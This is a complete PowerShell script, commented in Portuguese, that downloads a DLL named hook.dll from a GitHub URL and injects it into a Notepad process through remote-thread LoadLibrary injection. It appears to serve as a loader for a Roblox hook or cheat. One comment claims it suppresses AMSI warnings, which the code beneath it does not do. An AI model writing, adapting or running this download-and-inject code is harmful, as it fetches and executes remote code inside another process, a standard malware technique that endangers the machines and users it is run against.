# 1. Esconde os avisos do PowerShell e do AMSI
[System.Reflection.Assembly]::LoadWithPartialName("System.Management.Automation") | Out-Null

# 2. Abre o Bloco de Notas
Start-Process "C:\Windows\System32\notepad.exe"
Start-Sleep -Seconds 2
$target = Get-Process notepad | Select-Object -First 1
if (-not $target) { exit }

# 3. Baixa a hook.dll do GitHub
$DllUrl = "https://raw.githubusercontent.com/TeuUsuario/TeuRepo/main/hook.dll"
$DllPath = "$env:TEMP\hook.dll"
Invoke-WebRequest -Uri $DllUrl -OutFile $DllPath

# 4. Cria as funções de injeção (C#)
Add-Type -Name W -Namespace N -MemberDefinition '[DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint a, bool b, int c); [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr a, IntPtr b, uint c, uint d, uint e); [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr a, IntPtr b, byte[] c, uint d, out UIntPtr e); [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string a); [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr a, string b); [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr a, IntPtr b, uint c, IntPtr d, IntPtr e, uint f, IntPtr g);'

# 5. Injeta no Notepad
$h = [N.W]::OpenProcess(0x1F0FFF, $false, $target.Id)
$b = [Text.Encoding]::ASCII.GetBytes($DllPath + [char]0)
$m = [N.W]::VirtualAllocEx($h, 0, $b.Length, 0x3000, 4)
$w = [UIntPtr]::Zero
[N.W]::WriteProcessMemory($h, $m, $b, $b.Length, [ref]$w)
$k = [N.W]::GetModuleHandle("kernel32.dll")
$p = [N.W]::GetProcAddress($k, "LoadLibraryA")
[N.W]::CreateRemoteThread($h, 0, 0, $p, $m, 0, 0)

Write-Host "[-] Hook injetado no Bloco de Notas!" -ForegroundColor Green
Write-Host "[*] Abra o Roblox, vá no Bloco de Notas e aperte ENTER." -ForegroundColor Cyan